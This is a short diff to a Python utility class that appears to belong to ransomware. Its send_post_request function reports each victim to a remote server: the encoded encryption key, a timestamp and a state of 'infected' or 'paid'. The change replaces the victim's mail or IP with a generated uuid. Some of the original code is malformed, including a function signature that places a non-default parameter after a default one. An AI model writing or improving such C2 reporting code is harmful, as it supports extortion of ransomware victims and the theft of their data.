@@ -11,6 +11,7 @@ import requests
 import socket
 from datetime import datetime
 import traceback
+import uuid
 
 
 class Utils:
@@ -204,20 +205,19 @@ class Utils:
 
     {
         'operation': 'insert'/'update'
-        'ip': ip_direction,
+        'id': as a unique identifier,
         'key': encoded_key,
         'date': datetime,
         'state': 'infected'/'paid'
     }
     """
-    def send_post_request(self, url, mode='insert', mail, key, state='infected'):
+    def send_post_request(self, url, id, key, mode='insert', state='infected'):
         try:
-            #ipaddr = str(socket.gethostbyname(socket.gethostname()))
             if mode=='insert': 
                 date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-                data = {'operation':mode, 'mail': mail, 'key': str(key), 'date':date, 'state': state}
+                data = {'operation':mode, 'id': id, 'key': str(key), 'date':date, 'state': state}
             elif mode=='update':
-                data = {'operation':mode, 'mail': mail, 'state': state}
+                data = {'operation':mode, 'id': id, 'state': state}
             requests.post(url, json=data)
         except:
             traceback.print_exc()
